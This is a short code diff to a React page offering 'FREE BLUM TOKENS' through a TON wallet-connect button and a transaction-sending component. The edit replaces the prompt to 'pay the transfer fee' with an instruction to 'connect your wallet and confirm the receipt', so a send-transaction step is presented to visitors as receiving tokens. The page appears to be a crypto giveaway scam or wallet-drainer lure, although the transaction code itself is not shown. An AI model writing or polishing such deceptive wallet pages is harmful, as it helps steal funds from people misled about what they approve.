@@ -7,8 +7,6 @@ import telegramLogo from "./assets/telegram.png";
 import twitterLogo from "./assets/twitter.png";
 import discordLogo from "./assets/discord.png";
 
-//12345363457845884
-
 function App() {
   return (
     <>
@@ -29,11 +27,13 @@ function App() {
             <img src={blumLogo} className="logo" alt="React logo" />
           </a>
         </div>
-        <h1>GET FREE BLUM TOKENS</h1>
+        <h2>GET FREE BLUM TOKENS</h2>
 
-        <h2>To receive BLUM tokens, you need to pay the transfer fee.</h2>
+        <h3>
+          To receive BLUM tokens, connect your wallet and confirm the receipt.
+        </h3>
         <TonConnectButton />
-        <AddressInfo />
+
         <SendTx />
       </div>
     </>
